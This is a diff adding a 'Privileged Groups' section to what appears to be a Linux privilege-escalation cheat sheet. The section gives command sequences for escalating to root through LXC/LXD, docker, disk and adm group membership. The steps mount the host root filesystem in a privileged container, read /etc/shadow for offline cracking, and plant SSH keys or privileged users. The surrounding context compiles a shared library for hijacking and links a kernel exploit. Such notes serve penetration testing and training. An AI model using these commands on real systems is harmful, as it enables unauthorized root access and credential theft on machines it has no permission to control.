@@ -124,6 +124,32 @@ void dbquery() {
 
 gcc src.c -fPIC -shared -o /development/libshared.so
 ```
+##### Privileged Groups
+```bash
+LXC/LXD
+devops@NIX02:~$ unzip alpine.zip 
+devops@NIX02:~$ lxd init
+devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
+devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+devops@NIX02:~$ lxc start r00t
+
+DOCKER
+Members of the docker group can spawn new docker containers
+docker run -v /root:/mnt -it ubuntu
+browse to the mounted directory and retrieve or add SSH keys for the root user
+/etc which could be used to retrieve the contents of the /etc/shadow file 
+for offline password cracking or adding a privileged user
+
+DISK
+Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, 
+which is typically the main device used by the operating system.
+debugfs to access the entire file system with root level privileges
+
+ADM
+adm group are able to read all logs stored in /var/log.
+gather sensitive data stored in log files or enumerate user actions and running cron jobs.
+```
 ### Kernel Exploits
 ```bash
 Ubuntu 16.04.4 kernel priv esc - https://vulners.com/zdt/1337DAY-ID-30003
